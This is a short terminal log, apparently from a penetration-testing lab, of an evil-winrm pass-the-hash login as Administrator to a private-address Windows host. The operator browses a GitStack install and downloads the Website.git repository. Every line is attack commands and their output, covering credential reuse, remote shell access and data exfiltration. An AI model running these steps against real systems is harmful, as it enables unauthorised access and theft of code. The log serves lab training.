```
$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.100.150

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\..\..
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/8/2020   1:28 PM                GitStack
d-----       12/19/2020   5:37 PM                PerfLogs
d-r---         1/3/2021   2:35 PM                Program Files
d-----       12/20/2020   3:56 PM                Program Files (x86)
d-r---       12/20/2020   3:56 PM                Users
d-----        1/13/2021   1:05 PM                Windows


*Evil-WinRM* PS C:\> cd GitStack
*Evil-WinRM* PS C:\GitStack> dir


    Directory: C:\GitStack


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/8/2020   1:28 PM                apache
d-----        11/8/2020   1:28 PM                app
d-----         1/3/2021   3:45 AM                data
d-----        11/8/2020   1:28 PM                git
d-----        11/8/2020   1:28 PM                gitphp
d-----        11/8/2020   1:28 PM                php
d-----        11/8/2020   1:28 PM                python
d-----        11/8/2020   2:35 PM                repositories
d-----        11/8/2020   1:28 PM                templates
-a----        11/8/2020   1:28 PM          66800 uninstall.exe


*Evil-WinRM* PS C:\GitStack> cd repositories
*Evil-WinRM* PS C:\GitStack\repositories> dir


    Directory: C:\GitStack\repositories


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2021   7:05 PM                Website.git


*Evil-WinRM* PS C:\GitStack\repositories> download Website.git
```